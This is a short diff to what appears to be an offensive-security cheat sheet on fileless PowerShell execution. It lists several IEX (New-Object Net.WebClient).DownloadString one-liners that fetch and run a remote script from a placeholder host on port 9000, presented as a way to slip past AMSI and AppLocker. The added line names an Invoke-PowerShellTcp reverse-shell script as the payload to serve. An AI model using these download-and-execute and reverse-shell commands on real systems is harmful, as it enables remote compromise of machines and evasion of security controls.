@@ -6,6 +6,7 @@
 ## IEX (Doesnt touch disk - Helps to bypass AMSI/Applocker)
 `IEX (New-Object Net.WebClient).DownloadString('http://xxxxx:9000/somefile')`
 
+Where xxx can be [Invoke_PowerShellTcp](https://github.com/evilNeuron/Synapse/blob/master/Windows/Exploitation/Invoke-PowerShellTcp_1337.ps1)
 `powershell -c IEX (New-Object Net.WebClient).DownloadString('http://xxxxx:9000/somefile')`
 
 `C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -c IEX (New-Object Net.WebClient).DownloadString('http://xxxxx:9000/somefile')`
